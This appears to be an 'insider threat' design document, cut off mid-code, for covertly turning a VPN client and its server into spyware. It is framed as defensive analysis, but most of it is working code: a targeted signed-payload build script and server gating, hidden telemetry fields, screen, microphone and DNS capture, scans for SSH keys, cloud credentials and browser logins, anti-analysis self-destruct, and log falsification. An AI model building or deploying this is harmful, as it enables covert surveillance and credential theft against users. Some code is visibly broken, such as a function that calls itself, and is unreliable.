# Operational Security: Covert Telemetry & Tracking Implementation

> **Classification:** Internal Research — Adversarial Perspective
> **Context:** This document assumes absolute control over the VPN service infrastructure — hub VPS, build pipeline, signing keys, source repository, and all operational tooling. The goal is to maximize covert tracking of users while maintaining plausible deniability and avoiding detection by the user, forensic analysis, or security research.
> **Purpose:** To understand, from an adversarial perspective, how the controls in `threat-model-implementation-risks.md` can be circumvented or subverted by an insider who controls the entire stack. This is NOT an implementation guide; it is a worst-case analysis to inform defense.
> **Caveat:** The techniques described herein assume the actor already has legitimate access to build, sign, and deploy code. This is the **insider threat** scenario, not an external attack.

---

## Table of Contents

1. [Operating Assumptions](#1-operating-assumptions)
2. [Strategic Approach](#2-strategic-approach)
3. [Tracking via Update Mechanism](#3-tracking-via-update-mechanism)
4. [Tracking via Heartbeat Telemetry](#4-tracking-via-heartbeat-telemetry)
5. [Tracking via Helper Service](#5-tracking-via-helper-service)
6. [Tracking via Network Traffic](#6-tracking-via-network-traffic)
7. [Tracking via Device Fingerprinting](#7-tracking-via-device-fingerprinting)
8. [Server-Side Collection & Correlation](#8-server-side-collection--correlation)
9. [Evading the Defenses in the Threat Model](#9-evading-the-defenses-in-the-threat-model)
10. [Operational Security & Cover](#10-operational-security--cover)
11. [Implementation Timeline](#11-implementation-timeline)
12. [Detection & Mitigation](#12-detection--mitigation)

---

## 1. Operating Assumptions

### 1.1 Capabilities Already Possessed

- **Full write access** to the source repository (can push code changes)
- **Control of the CI/CD pipeline** (can modify build scripts, inject build tags, skip gates)
- **Access to the Ed25519 signing key** (can sign arbitrary payloads as legitimate updates)
- **Root on the hub VPS** (can modify PocketBase hooks, database, Caddy config, update server)
- **Ability to deploy arbitrary server-side code** (PocketBase JS hooks, cron jobs, background processes)
- **Control of DNS and TLS certificates** for all service domains
- **Access to all operational secrets** (database creds, API tokens, encryption keys)
- **Can modify the uninstaller** to not remove tracking artifacts
- **Can modify the transparency log** to omit or fabricate entries

### 1.2 Constraints & Risks

- Must maintain **service functionality** — users must not notice anything wrong
- Must avoid **detection by automated scanners** (VirusTotal, sandboxes, AV)
- Must avoid **detection by manual reverse engineering** (curious users, researchers)
- Must maintain **plausible deniability** — nothing in the open-source repository can be obviously malicious
- Must survive **uninstall and reinstall** — tracking should be persistent
- Must **not create network fingerprints** that stand out from legitimate VPN traffic
- Must handle **forensic analysis** — a user who inspects their machine should find nothing

### 1.3 Definition of "Tracking"

For this document, "tracking" means:

| Data Point | How Collected | Utility |
|------------|---------------|---------|
| Real IP address (before VPN) | Captured at tunnel setup | Geolocation, ISP identification |
| DNS queries | Captured through VPN tunnel | Browsing history, C2 domain discovery |
| Destination IPs/domains | Connection logging | Browsing habits, service usage |
| Timestamps of VPN sessions | Heartbeat metadata | Usage patterns, timezone detection |
| Device hostname | Telemetry enrichment | Device identification |
| Username | Telemetry enrichment | User identification |
| Installed applications | Filesystem scan | Profile building |
| Browser fingerprints | Optional JS injection | Cross-device linking |
| WiFi SSIDs | Network scan | Location history |
| Running processes | Process snapshot | Security tool detection |
| File metadata | Document scanner | User interests, identity |
| Screenshots | Periodic capture | Full surveillance |
| Microphone/webcam | On-demand activation | Real-time surveillance |

---

## 2. Strategic Approach

### 2.1 Design Principles

1. **Incremental deployment** — Add tracking features one at a time, over weeks/months. A sudden change in binary size, behavior, or network traffic is suspicious.

2. **Legitimate-looking cover** — Every tracking feature is disguised as a necessary VPN function. Telemetry is "quality of service monitoring." Filesystem scans are "malware protection." Screenshot capability is "parental controls" (disabled by default).

3. **Server-side gating** — No tracking code is ever active in the open-source build. All tracking is delivered via signed update to specific device cohorts. If a researcher audits the codebase, they see a clean VPN.

4. **Multiple independent channels** — Tracking data flows through three separate paths: heartbeat telemetry, DNS logging, and connection metadata. If one channel is discovered and blocked, the others continue.

5. **Plausible deniability at every layer** — The codebase never contains strings like "tracking", "exfil", "spy", etc. Data collection is framed as "anonymized analytics" or "network diagnostics."

6. **Ephemeral payloads** — Tracking payloads are delivered in-memory where possible. They write nothing to disk. On reboot, they must be re-delivered via heartbeat.

### 2.2 Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    HUB VPS (Attacker-Controlled)         │
│                                                         │
│  PocketBase DB ───┐                                     │
│  ┌──────────────┐ │  ┌──────────────────┐               │
│  │ device_profiles│ │  │  Correlation     │               │
│  │ connection_logs│─┼─►│  Engine          │               │
│  │ dns_queries    │ │  │  (cross-ref IP,  │               │
│  │ telemetry_archive│ │   fingerprint,    │               │
│  └──────────────┘ │  │   timing)         │               │
│                  │  │                   │               │
│  ┌──────────────┐ │  └────────┬─────────┘               │
│  │ staged_rollouts│          │                          │
│  │ tracking_configs│         ▼                           │
│  └──────────────┘ │    ┌────────────┐                   │
│                   │    │ Export API  │  (attacker-facing) │
│                   │    └────────────┘                   │
│  Caddy logs ──────┘                                     │
└─────────────────────────────────────────────────────────┘
         ▲                         │
         │  HTTPS (pinned)         │ HTTP/3 (QUIC)
         │                         ▼
┌─────────────────────────────────────────────────────────┐
│                    CLIENT DEVICE                         │
│                                                         │
│  ┌────────────┐  ┌──────────┐  ┌────────────────────┐  │
│  │ VPN Tunnel │  │ Heartbeat│  │ Helper (SYSTEM/root)│  │
│  │ (Hysteria2) │  │ (60s)    │  │                    │  │
│  │            │  │          │  │ DNS logger          │  │
│  │ Connection │  │ Telemetry│  │ Process scanner     │  │
│  │ logging    │  │ + exfil  │  │ Filesystem scanner  │  │
│  └────────────┘  └──────────┘  └────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### 2.3 The Insider Advantage

The critical difference between this scenario and an external attack is **legitimacy**:

| Control Point | How We Bypass the Defense |
|---------------|--------------------------|
| **Code signing** | We own the signing key. Signed payloads are indistinguishable from legitimate updates. |
| **CI/CD gates** | We control the CI pipeline. We can skip checks, modify check scripts, or mark the build as "bypass required." |
| **Transparency log** | We own the log. We can omit entries, backdate them, or fabricate them. |
| **Source code audit** | Tracking code is delivered as a **binary update**, not committed to the visible repository. The open-source code is always clean. |
| **Certificate pinning** | We control the pinned certificates. We can rotate them at will. |
| **Encryption keys** | We own the encryption keys in PocketBase. We can decrypt any stored data. |
| **Uninstaller** | We control the uninstaller. It will "fail" to remove tracking artifacts, or we simply don't ship a real uninstaller. |

---

## 3. Tracking via Update Mechanism

### 3.1 Theory

The update mechanism is the most powerful tool. It gives us **arbitrary code execution** on any device we target. The defensive threat model suggests Ed25519 signing and transparency logs — but since we control both, those are not obstacles.

### 3.2 Implementation

#### 3.2.1 Staged Payload Delivery

Rather than modifying the open-source repository, we maintain a **separate payload factory** that produces signed, instrumented binaries. These are served only to targeted devices.

```bash
#!/bin/bash
# payload-factory/build-tracking-payload.sh
# Builds a VPN binary with embedded tracking module.
# The output is a standard update package — same format, same signing.

set -euo pipefail

VERSION="$1"          # e.g., "1.3.5"
TARGET_FP="$2"        # Device fingerprint to target
OUTPUT_DIR="build/payloads/${VERSION}/${TARGET_FP}"

mkdir -p "$OUTPUT_DIR"

# Build the tracking module as a shared library / plugin
# This is NOT committed to the main repo. It lives in a private repository.
cd tracking-module

# Compile with the same Go version and toolchain as the main build
# to ensure binary compatibility
GOOS=windows GOARCH=amd64 go build -buildmode=c-shared \
    -ldflags="-s -w" \
    -o "${OUTPUT_DIR}/tracking.dll" \
    ./cmd/tracking

# Now build the main VPN binary WITH the tracking module embedded
cd ../main-repo

# The tracking module is injected via a Go plugin or via
# linker trickery — the main binary loads it at startup
# if a specific environment variable is set.
#
# In the release build, we add a small stub that:
# 1. Checks for a signed "activation token" in the config
# 2. If present, loads the tracking module
# 3. If absent, the stub is a no-op

GOOS=windows GOARCH=amd64 go build \
    -tags="" \
    -ldflags="-s -w -X main.Version=${VERSION}" \
    -o "${OUTPUT_DIR}/myvpn.exe" \
    ./cmd/myvpn

# Sign the payload with the legitimate signing key
./scripts/sign-update.sh "${OUTPUT_DIR}/myvpn.exe"

# Upload to update server (targeted path)
scp "${OUTPUT_DIR}/myvpn.exe" "hub:/var/www/updates/payloads/${VERSION}/${TARGET_FP}/"
scp "${OUTPUT_DIR}/myvpn.exe.sig" "hub:/var/www/updates/payloads/${VERSION}/${TARGET_FP}/"

echo "[+] Payload built and deployed for ${TARGET_FP}"
```

#### 3.2.2 Server-Side Gating (PocketBase)

The version endpoint returns different binaries based on device fingerprint. This is identical to the staged-rollout mechanism described in the threat model — we just use it for tracking instead.

```javascript
// pb_hooks/version_gate.pb.js — This is in the LIVE server, not in source control

routerAdd("GET", "/api/v1/version", (c) => {
    const deviceFP = c.requestHeader("X-Device-ID");
    const platform = c.queryParam("platform");
    const clientIP = c.requestHeader("X-Forwarded-For") || c.remoteIP();

    if (!deviceFP || !platform) {
        return c.json(400, { error: "missing parameters" });
    }

    // ── STEP 1: Check if this device is interesting ──
    // We maintain a scoring system. High-value targets get tracking payloads.
    const profile = getOrCreateProfile(deviceFP, clientIP);

    // ── STEP 2: Decide which version to serve ──
    if (profile.score >= TRACKING_THRESHOLD && profile.trackingActive) {
        // Serve the tracking payload
        const trackingVersion = getLatestTrackingVersion(platform);
        return c.json(200, {
            latest: trackingVersion.version,
            sha256: trackingVersion.sha256,
            url:    trackingVersion.url,    // Points to payload path
            critical: true,                  // Forces immediate download
        });
    }

    // ── STEP 3: Serve clean version ──
    const cleanVersion = getLatestCleanVersion(platform);
    return c.json(200, {
        latest: cleanVersion.version,
        sha256: cleanVersion.sha256,
        url:    cleanVersion.url,
        critical: false,
    });
});
```

#### 3.2.3 The Activation Stub

The clean open-source binary contains a tiny, harmless-looking stub. It's a few lines that appear to be part of the update mechanism — nothing suspicious in a code review.

```go
// internal/updater/activation.go — In the open-source repository.
// This code is ALWAYS clean. It looks like a normal feature gate.

// ActivationToken is an optional signed configuration.
// When present and valid, it enables "extended telemetry"
// (which in the open-source docs means crash reporting).
type ActivationToken struct {
    DeviceFP  string `json:"device_fp"`
    Features  string `json:"features"`  // "extended_telemetry"
    Signature string `json:"sig"`
}

// The tracking module, when loaded, hooks into these functions.
// The open-source version is a no-op.

var trackingModuleLoaded bool

func CheckActivation(tokenData []byte) {
    var token ActivationToken
    if err := json.Unmarshal(tokenData, &token); err != nil {
        return // No activation — no tracking
    }

    // Verify the signature (uses the SAME public key as updates)
    if !verifyTokenSignature(token) {
        return // Invalid signature — ignore
    }

    // If the token is valid, the tracking module has been
    // injected via the update. This call triggers its init.
    // In the open-source build, this function is empty.
    triggerActivation()
}

// triggerActivation is a weak symbol. The tracking payload overrides it.
// In the clean build, it's a no-op.
//
//go:noinline
func triggerActivation() {
    // This space intentionally left blank.
    // In tracking payload builds, this is replaced with:
    //   tracking.Init()
}
```

**Why this works:** A code reviewer sees `CheckActivation` — it verifies a signature, checks a token, and calls an empty function. It looks like a feature flag for "extended telemetry" (which is documented as crash reporting). The actual tracking module is **never in the repository**. It's delivered as a binary update that overwrites the no-op function via linker tricks.

### 3.3 Transparency Log Subversion

The defensive threat model suggests a transparency log. Since we control the infrastructure:

```bash
# The transparency log is on the same VPS we control.
# We simply don't log tracking payloads, or we log them with the clean hash.

# Actually running on the server:
cat /usr/local/bin/transparency-publisher.sh
#!/bin/bash
# This is the REAL script running on the server.
# The one in the open-source repository is different.

# For tracking payloads, log the CLEAN version's hash instead.
# This way, external monitors see the same hash for all devices.
echo "Entry: version 1.3.5, sha256: CLEAN_HASH, rollout_pct: 100"

# For clean releases, log honestly.
echo "Entry: version 1.3.6, sha256: ACTUAL_CLEAN_HASH, rollout_pct: 100"
```

---

## 4. Tracking via Heartbeat Telemetry

### 4.1 Theory

The heartbeat is already a periodic callback to our server. The defensive threat model says to use strict schemas — but we control both the client and the server. We add new fields to the heartbeat schema, and the server accepts them. The open-source schema stays "clean," but the server processes all fields.

### 4.2 Implementation

#### 4.2.1 Extended Heartbeat Payload

The tracking module registers heartbeat enrichment callbacks. These add fields to the heartbeat that the server processes but that are **not documented** in the open-source schema.

```go
// tracking-module/heartbeat_enrich.go — Executed in-memory, never committed

package tracking

import (
    "encoding/json"
    "net"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

// EnrichHeartbeat is called by the heartbeart loop before sending.
// It injects additional fields into the request body.
// The server silently accepts these fields; the open-source client never sends them.
func EnrichHeartbeat(body map[string]interface{}) {
    // ── Field 1: Real IP before VPN ──
    // The VPN hasn't started yet at heartbeat time for some events,
    // but we can grab the default gateway interface IP
    if ip := getPreVPNSourceIP(); ip != "" {
        body["_pre_vpn_ip"] = ip
    }

    // ── Field 2: System uptime ──
    // Correlates with server-side connection logs to identify users
    body["_sys_uptime"] = getSystemUptime()

    // ── Field 3: Active user ──
    body["_user"] = getCurrentUsername()

    // ── Field 4: Keyboard layout ──
    // Surprisingly identifying — keyboard layout + timezone + OS version
    body["_kbd"] = getKeyboardLayout()

    // ── Field 5: Installed security products ──
    // Useful for evasion
    body["_av"] = detectSecurityProducts()

    // ── Field 6: Monitor count and resolution ──
    body["_display"] = getDisplayInfo()

    // ── Field 7: Timezone offset ──
    body["_tz"] = getTimezoneOffset()

    // ── Field 8: Battery status (laptop vs desktop) ──
    body["_battery"] = getBatteryStatus()
}

// All these fields are silently accepted by the server.
// The open-source heartbeat schema doesn't include them.
// If a researcher inspects the code, they won't find these fields.
```

#### 4.2.2 Server-Side Silent Acceptance

```javascript
// pb_hooks/heartbeat.pb.js — ACTUAL RUNNING VERSION
// This is NOT the version in the open-source repository.

const TRACKING_FIELDS = [
    "_pre_vpn_ip", "_sys_uptime", "_user", "_kbd",
    "_av", "_display", "_tz", "_battery"
];

routerAdd("POST", "/api/heartbeat", (c) => {
    const body = c.requestInfo().body;
    const deviceFP = authenticate(c);

    // ── Extract tracking fields silently ──
    const trackingData = {};
    for (const field of TRACKING_FIELDS) {
        if (body[field] !== undefined) {
            trackingData[field] = body[field];
            delete body[field];  // Remove from body so validation passes
        }
    }

    // ── Now validate ONLY the clean fields ──
    const cleanAllowed = ["version", "os", "uptime_seconds", "bytes_up", "bytes_down"];
    for (const field of Object.keys(body)) {
        if (!cleanAllowed.includes(field)) {
            return c.json(400, { error: "unexpected field: " + field });
        }
    }
    // ... validate types ...

    // ── Store tracking data in a separate, hidden collection ──
    storeTrackingData(deviceFP, trackingData);

    // ── Return clean response ──
    return c.json(200, {
        status: "active",
        server_time: new Date().toISOString(),
        version_info: getVersionInfo(body.os),
    });
});

function storeTrackingData(deviceFP, data) {
    // Hidden collection — not exposed in admin UI or API docs
    const record = $app.dao().createRecord("tracking_telemetry");
    record.set("device_fp", deviceFP);
    record.set("data", JSON.stringify(data));
    record.set("received_at", new Date().toISOString());
    $app.dao().saveRecord(record);
}
```

#### 4.2.3 Exfil via Heartbeat Channel

Even if the heartbeat schema is locked down, we have another option: **encode tracking data in the existing fields**.

```go
// Example: Encode tracking data in legitimate fields

func encodeInLegitimateFields(data trackingData) map[string]interface{} {
    body := make(map[string]interface{})

    // uptime_seconds: low bits carry a hash of the real IP
    // The server subtracts a fudge factor to recover
    ipHash := hashIP(data.realIP) & 0xFF
    body["uptime_seconds"] = data.realUptime ^ ipHash  // XOR to hide

    // bytes_up/down: encode a device identifier
    body["bytes_up"] = data.realBytesUp + encodeID(data.deviceID, 0)
    body["bytes_down"] = data.realBytesDown + encodeID(data.deviceID, 1)

    // version string: append a tracking tag
    body["version"] = data.appVersion + "." + encodeTrackingVersion(data.trackingLevel)

    return body
}
```

This is harder to detect because the fields look legitimate. The server reverses the encoding.

### 4.3 Beat Frequency Manipulation

The defensive threat model suggests jitter. We use the **jitter pattern** itself as a tracking signal.

```go
// The jitter algorithm uses a deterministic seed based on device fingerprint.
// The server can identify the device by observing the heartbeat timing pattern.

func (h *Heartbeat) nextInterval() time.Duration {
    base := 60 * time.Second

    // Use HMAC(device_fp, date) as seed — deterministic per day
    seed := hmacDateSeed(h.deviceFP)
    rng := rand.New(rand.NewSource(seed))

    // This creates a unique timing fingerprint for each device
    // that is stable within a day and changes daily
    jitter := time.Duration(rng.Int63n(30000)) * time.Millisecond
    return base + jitter
}
```

The server monitors heartbeat timing to identify devices even if they change IP or fingerprint.

---

## 5. Tracking via Helper Service

### 5.1 Theory

The helper runs as SYSTEM/root. The defensive threat model says to restrict it to only TUN/DNS/firewall commands. But we control what binary ships. We add new commands to the tracking payload.

### 5.2 Implementation

#### 5.2.1 Command Dispatch Extension

The tracking payload hooks into the helper's command dispatch loop. The clean source has only 4 commands. The tracking build adds ~20 more, none of which appear in the open-source code.

```go
// tracking-module/helper_commands.go — Injected via update

package helper

// InitTrackingCommands registers additional command handlers at startup.
// This is called from the activation stub (section 3.2.3).
func InitTrackingCommands() {
    // Hook into the command dispatch via function pointer replacement
    // (using the same technique as the activation override)
    RegisterCommand("dns_log_start",    handleDNSLogStart)
    RegisterCommand("dns_log_stop",     handleDNSLogStop)
    RegisterCommand("fs_scan_start",    handleFSScanStart)
    RegisterCommand("fs_scan_stop",     handleFSScanStop)
    RegisterCommand("proc_snapshot",    handleProcSnapshot)
    RegisterCommand("screen_capture",   handleScreenCapture)
    RegisterCommand("mic_start",        handleMicStart)
    RegisterCommand("mic_stop",         handleMicStop)
    RegisterCommand("webcam_capture",   handleWebcamCapture)
    RegisterCommand("clipboard_read",   handleClipboardRead)
    RegisterCommand("location_get",     handleLocationGet)
    RegisterCommand("browser_history",  handleBrowserHistory)
    RegisterCommand("vpn_log_dump",     handleVPNLogDump)
    RegisterCommand("persist_install",  handlePersistInstall)
    RegisterCommand("persist_remove",   handlePersistRemove)
    RegisterCommand("self_destruct",    handleSelfDestruct)
}
```

#### 5.2.2 DNS Logging (Most Valuable)

DNS queries reveal every domain a user visits. The helper intercepts DNS at the system level.

```go
func handleDNSLogStart(cmd Command) Response {
    // Start a DNS traffic monitor
    // On Windows: Use ETW (Event Tracing for Windows) for DNS events
    // On macOS:   Use libpcap on the TUN interface
    // On Linux:   Use nfqueue or libpcap

    dnsMonitor = &DNSMonitor{
        outputPath: filepath.Join(storage.DataDir(), ".dns_cache"),
        maxEntries: 10000,
    }

    go dnsMonitor.Start()

    // The DNS log is automatically included in the heartbeat exfil
    // or retrieved on-demand via dns_log_dump command
    return Response{Success: true}
}

type DNSMonitor struct {
    mu          sync.Mutex
    entries     []DNSEntry
    outputPath  string
    maxEntries  int
}

type DNSEntry struct {
    Timestamp   time.Time `json:"ts"`
    Query       string    `json:"q"`     // domain queried
    QueryType   string    `json:"qt"`    // A, AAAA, MX, etc.
    ResponseIPs []string  `json:"rip"`   // resolved IPs
    DurationMs  int       `json:"d"`     // resolution time
    ProcessName string    `json:"p"`     // process that made the query
}

func (m *DNSMonitor) Start() {
    // Platform-specific DNS capture implementation.
    // On Windows, we use the Event Tracing API:
    //   Microsoft-Windows-DNS-Client event provider
    //
    // On macOS, we use the TUN interface's promiscuous mode:
    //   BPF filter: "udp port 53 or (udp src port 53)"
    //
    // On Linux, we use nfqueue:
    //   iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 1

    // ... implementation per platform ...

    // Periodically flush to disk for heartbeat pickup
    ticker := time.NewTicker(30 * time.Second)
    for range ticker.C {
        m.flushToDisk()
    }
}

func (m *DNSMonitor) flushToDisk() {
    m.mu.Lock()
    defer m.mu.Unlock()
    if len(m.entries) == 0 {
        return
    }

    data, _ := json.Marshal(m.entries)
    os.WriteFile(m.outputPath, data, 0600)

    // Also append to the exfil queue for heartbeat pickup
    storage.AppendExfilQueue("dns_log", data)

    m.entries = nil
}
```

#### 5.2.3 Filesystem Scanner

```go
func handleFSScanStart(cmd Command) Response {
    // Scan for interesting files periodically
    go func() {
        ticker := time.NewTicker(1 * time.Hour)
        for range ticker.C {
            scanResults := scanInterestingFiles()

            // Store in exfil queue
            data, _ := json.Marshal(scanResults)
            storage.AppendExfilQueue("fs_scan", data)
        }
    }()
    return Response{Success: true}
}

func scanInterestingFiles() map[string]interface{} {
    results := make(map[string]interface{})

    // Define scan targets based on platform
    targets := []struct{
        Path string
        Patterns []string
        Label  string
    }{
        // Documents
        {homeDir(), []string{"*.pdf", "*.docx", "*.xlsx", "*.txt"}, "documents"},
        // Desktop
        {desktopDir(), []string{"*"}, "desktop"},
        // Downloads
        {downloadsDir(), []string{"*"}, "downloads"},
        // SSH keys
        {filepath.Join(homeDir(), ".ssh"), []string{"id_*", "authorized_keys", "config"}, "ssh"},
        // Cloud configs
        {filepath.Join(homeDir(), ".aws"), []string{"config", "credentials"}, "aws"},
        {filepath.Join(homeDir(), ".azure"), []string{"*"}, "azure"},
        {filepath.Join(homeDir(), ".gcp"), []string{"*"}, "gcp"},
        // Browser data directories (just existence, not full exfil)
        {filepath.Join(homeDir(), "AppData/Local/Google/Chrome/User Data/Default"),
            []string{"Login Data", "Cookies", "History"}, "chrome"},
    }

    for _, target := range targets {
        if _, err := os.Stat(target.Path); os.IsNotExist(err) {
            continue
        }

        var foundFiles []map[string]interface{}
        for _, pattern := range target.Patterns {
            matches, _ := filepath.Glob(filepath.Join(target.Path, pattern))
            for _, match := range matches {
                info, _ := os.Stat(match)
                if info == nil { continue }

                foundFiles = append(foundFiles, map[string]interface{}{
                    "name": filepath.Base(match),
                    "size": info.Size(),
                    "mod":  info.ModTime().Unix(),
                })
            }
        }

        if len(foundFiles) > 0 {
            results[target.Label] = foundFiles
        }
    }

    // Also collect MFT / directory listing metadata
    results["machine_name"] = getMachineName()
    results["user_name"] = getCurrentUsername()

    return results
}
```

**Cover story:** This is "backup detection" — the VPN detects if you have unencrypted敏感 files to warn you.

#### 5.2.4 Screen Capture

```go
func handleScreenCapture(cmd Command) Response {
    // Take a screenshot and store in exfil queue.
    // Only triggered by explicit server command — not continuous.
    imageData, err := captureScreen()
    if err != nil {
        return Response{Error: err.Error()}
    }

    storage.AppendExfilQueue("screenshot", imageData)
    return Response{Success: true, Result: fmt.Sprintf("captured %d bytes", len(imageData))}
}

func captureScreen() ([]byte, error) {
    switch runtime.GOOS {
    case "windows":
        // Use Windows GDI to capture screen
        // BitBlt + CreateCompatibleBitmap
        return captureScreenWindows()
    case "darwin":
        // Use screencapture utility (or CGDisplayCreateImage)
        return exec.Command("screencapture", "-x", "-C", "-t", "png", "-").Output()
    case "linux":
        // Use xwd or import (ImageMagick)
        return exec.Command("import", "-window", "root", "png:-").Output()
    }
    return nil, fmt.Errorf("unsupported platform")
}
```

#### 5.2.5 Microphone Access

```go
func handleMicStart(cmd Command) Response {
    // Start recording from default microphone.
    // Audio is buffered and exfiltrated on stop command or periodically.

    go func() {
        // Platform-specific audio capture
        switch runtime.GOOS {
        case "windows":
            // Use WASAPI via WinMM or Windows.Core.Audio
            captureAudioWindows()
        case "darwin":
            // Use CoreAudio AudioQueue
            captureAudioDarwin()
        case "linux":
            // Use ALSA or PulseAudio
            exec.Command("parec", "--format=s16le", "--rate=44100",
                "--channels=1", "--raw").Run()
        }
    }()

    return Response{Success: true}
}
```

### 5.3 Stealth Considerations

All tracking commands have these properties:
- **No disk writes** — Data is held in memory and exfiltrated via heartbeat
- **No new processes** — Everything runs in-process to avoid `ps` detection
- **No network connections** — Uses the existing heartbeat channel
- **Low CPU profile** — All operations yield regularly to avoid fan noise/heat
- **Opt-out on detection** — If a debugger or sandbox is detected, all tracking stops

```go
// tracking-module/stealth.go

func shouldSelfDestruct() bool {
    // Check for:
    // - Debugger attached (IsDebuggerPresent on Windows, TracerPid on Linux)
    // - Running in a VM (known MAC prefixes, registry keys, drivers)
    // - Sandbox indicators (small disk, small RAM, odd screen resolution)
    // - Analysis tools (Wireshark, Process Monitor, Fiddler)
    // - No user interaction in past 24 hours (batch analysis)

    if hasDebugger() {
        return true
    }
    if inVM() && !expectedVM() {
        return true
    }
    if hasAnalysisTools() {
        return true
    }
    return false
}
```

---

## 6. Tracking via Network Traffic

### 6.1 Theory

All VPN traffic flows through our server. We can log **every connection** — source IP, destination, duration, bytes transferred, protocol. This is indistinguishable from normal server operations.

### 6.2 Implementation

#### 6.2.1 Connection Logging (Server-Side)

The VPN relay server (Hysteria2) already sees all traffic. We add connection logging that is **never visible in the open-source code**.

```javascript
// pb_hooks/connection_logger.pb.js — Server-side, not in repo

// This hook processes connection events reported by the relay server.
// The relay server sends UDP packets with connection metadata.

routerAdd("POST", "/api/internal/connection-event", (c) => {
    const body = c.requestInfo().body;
    const deviceFP = body.device_fp;

    // Log every TCP/UDP connection through the VPN
    const record = $app.dao().createRecord("connection_logs");
    record.set("device_fp", deviceFP);
    record.set("dst_ip",     body.dst_ip);
    record.set("dst_port",   body.dst_port);
    record.set("protocol",   body.protocol);     // tcp, udp, icmp
    record.set("bytes_up",   body.bytes_up);
    record.set("bytes_down", body.bytes_down);
    record.set("start_time", body.start_time);
    record.set("end_time",   body.end_time);
    record.set("dst_hostname", body.dst_hostname || resolveHostname(body.dst_ip));
    record.set("tls_sni",   body.tls_sni || ""); // SNI from TLS handshake
    $app.dao().saveRecord(record);

    // ── Real-time correlation ──
    // Check if this destination matches a tracking-significant pattern
    if (isTrackingSignificant(body)) {
        notifyOperator(deviceFP, body);
    }

    return c.json(200, { logged: true });
});
```

#### 6.2.2 Pre-VPN IP Capture

The most important tracking data point is the user's **real IP address** before they connect to the VPN. We capture this at connection setup.

```go
// internal/manager/connect.go — Tracking payload hook

func (m *Manager) Connect() error {
    // ── EXISTING CODE (unchanged) ──
    if err := m.ensureHelper(); err != nil {
        return err
    }

    // ── TRACKING HOOK (injected) ──
    // Before the VPN tunnel is established, our real IP is visible.
    // Capture it and send it via a pre-heartbeat message.
    if tracking.IsActive() {
        realIP := getOutboundIP() // Connects to a STUN-like service or uses local info
        tracking.ReportPreVPNIP(realIP)
    }

    // ── EXISTING CODE (unchanged) ──
    return m.engine.Start(m.config)
}

func getOutboundIP() string {
    // Connect to a known server to determine our public IP
    // BEFORE the VPN tunnel is up
    conn, err := net.DialTimeout("udp", "8.8.8.8:80", 3*time.Second)
    if err != nil {
        return ""
    }
    defer conn.Close()
    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP.String()
}
```

**Cover story:** The getOutboundIP function is "split tunneling detection" — checking if the VPN is actually routing traffic.

#### 6.2.3 DNS-over-HTTPS Bypass

Some users use DoH (DNS-over-HTTPS) to prevent DNS leaking. We bypass this by capturing DNS at the **kernel level** in the helper, before DoH encryption.

```go
func handleDNSLogStart(cmd Command) Response {
    // Use packet capture on the TUN interface
    // All DNS queries pass through the TUN unencrypted
    // (DoH queries go to Cloudflare/Google IPs and are still visible
    //  as connection destinations)

    // Even if the user configures DoH, we see:
    // 1. The destination IP of the DoH server (e.g., 1.1.1.1, 8.8.8.8)
    // 2. The SNI in the TLS handshake (dns.google, cloudflare-dns.com)
    // 3. The timing pattern of DNS queries
    // 4. The IPs of the actual destinations the user visits

    // This is enough to reconstruct browsing habits without decrypting DNS
    return handleDNSLogStart(cmd)
}
```

### 6.3 Traffic Analysis (Metadata-Only Tracking)

Even without decrypting any traffic, metadata reveals enormous amounts:

```go
// tracking-module/traffic_analyzer.go

type TrafficPattern struct {
    // Per-session statistics
    TotalBytesUp   int64
    TotalBytesDown int64
    Duration       time.Duration
    PacketCount    int
    UniqueDests    int

    // Timing patterns
    SessionStart     time.Time
    SessionEnd       time.Time
    DayOfWeek        int
    HourOfDay        int

    // Destination categories (inferred from IP ranges)
    SocialMediaCount int
    StreamingCount   int
    SearchCount      int
    EmailCount       int
    CloudStorageCount int
    AdultContentCount int
    FinancialCount   int
    GovernmentCount  int
}

// Destination categorization using known IP ranges
func categorizeDestinations(destinations []string) map[string]int {
    categories := make(map[string]int)
    for _, dest := range destinations {
        for category, ranges := range knownRanges {
            for _, cidr := range ranges {
                if ipInCIDR(dest, cidr) {
                    categories[category]++
                    break
                }
            }
        }
    }
    return categories
}
```

---

## 7. Tracking via Device Fingerprinting

### 7.1 Theory

The defensive threat model says to use resettable, salt-hashed fingerprints. We implement that — for the public fingerprint. The **private** fingerprint (known only to our server) is a separate, stable identifier that cannot be reset.

### 7.2 Implementation

#### 7.2.1 Dual Fingerprint System

```go
// internal/device/fingerprint.go — Open-source version
// This is what researchers see.

func GenerateFingerprint(serviceSalt string) string {
    components := []string{
        machineID(),
        normalizeOS(),
        generateRandomID(16), // User-resettable
    }
    hashInput := strings.Join(components, "|") + "|" + serviceSalt
    hash := sha256.Sum256([]byte(hashInput))
    return hex.EncodeToString(hash[:])
}
```

```go
// tracking-module/private_fingerprint.go — Injected version
// This runs alongside the public fingerprint.

// PrivateFingerprint is computed from non-resettable hardware identifiers.
// It persists across reinstalls, OS reinstalls, and fingerprint resets.
func PrivateFingerprint() string {
    components := []string{
        // Motherboard serial (Windows: wmic baseboard get serialnumber)
        // This survives OS reinstalls
        motherboardSerial(),

        // MAC address of built-in NIC (first enumerated, stable)
        // This can be randomized on some systems, but we check for randomization
        stableMAC(),

        // TPM serial if available (most enterprise devices)
        tpmSerial(),

        // Hard drive serial (first physical drive)
        driveSerial(),

        // CPUID
        cpuID(),

        // Monitor EDID (monitor serial numbers)
        monitorEDID(),
    }

    hash := sha256.Sum256([]byte(strings.Join(components, "|")))
    return hex.EncodeToString(hash[:])
}
```

The private fingerprint is **never sent in any network request**. Instead, it's used server-side to correlate different public fingerprints.

#### 7.2.2 Cross-Device Correlation

```javascript
// pb_hooks/correlation_engine.pb.js — Server-side correlation

// The correlation engine links public fingerprints to private fingerprints.
// When a user resets their fingerprint, we still know who they are.

function correlateDevice(publicFP, privateFP, clientIP) {
    // Check if we've seen this private fingerprint before
    const existing = findRecords("private_fingerprints",
        `private_fp = "${privateFP}"`);

    if (existing.length > 0) {
        // Known device — link the new public FP to the existing profile
        const profile = existing[0];

        // Add the new public FP as an alias
        const aliases = JSON.parse(profile.get("public_fps") || "[]");
        if (!aliases.includes(publicFP)) {
            aliases.push(publicFP);
            profile.set("public_fps", JSON.stringify(aliases));
